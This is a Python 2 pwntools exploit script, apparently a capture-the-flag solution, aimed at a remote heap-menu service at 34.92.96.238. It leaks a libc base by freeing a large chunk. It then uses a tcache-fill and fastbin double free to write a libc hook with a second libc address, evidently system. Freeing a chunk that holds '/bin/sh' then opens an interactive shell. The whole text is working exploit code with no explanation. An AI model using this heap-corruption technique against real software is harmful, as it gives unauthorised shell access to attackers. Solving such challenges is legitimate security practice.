from pwn import *

#r = process('./chall', env={'LD_PRELOAD': './lib/libc.so.6'})
r = remote('34.92.96.238', 10001)

def add_girl(size, name, call):
	print 1
	r.sendafter('Input your choice:', '1\n')
	r.sendafter('\n', str(size) + '\n')
	r.sendafter('\n', name)
	r.sendafter('\n', call)

def show_girl(index):
	r.sendafter('Input your choice:', '2\n')
	r.sendafter('\n', str(index) + '\n')
	r.recvuntil('name:\n')
	return {
		'name': r.recvuntil('\nphone:\n').split('\nphone:')[0],
		'phone': r.recvuntil('\nDone!').split('\nDone!')[0]
	}

def call_girl(index):
	r.sendafter('Input your choice:', '4\n')
	r.sendafter('\n', str(index) + '\n')	

add_girl(0x1000, 'test', '1337')
add_girl(0x10, '/bin/sh\x00', '1337')
call_girl(0)
libc = u64(show_girl(0)['name'].ljust(8, '\x00')) - 0x3b1ca0
log.success('Libc @ ' + hex(libc))

for _ in range(9):
	add_girl(0x20, 'test', '1337')

for i in range(7):
	call_girl(2 + i)

call_girl(9)
call_girl(10)
call_girl(9)

for _ in range(7):
	add_girl(0x20, 'test', '1337')

add_girl(0x20, p64(libc + 0x3b38c8), '1337')
add_girl(0x20, 'test', '1337')
add_girl(0x20, 'test', '1337')
add_girl(0x20, p64(libc + 0x41c30), '1337')

call_girl(1)

r.interactive()
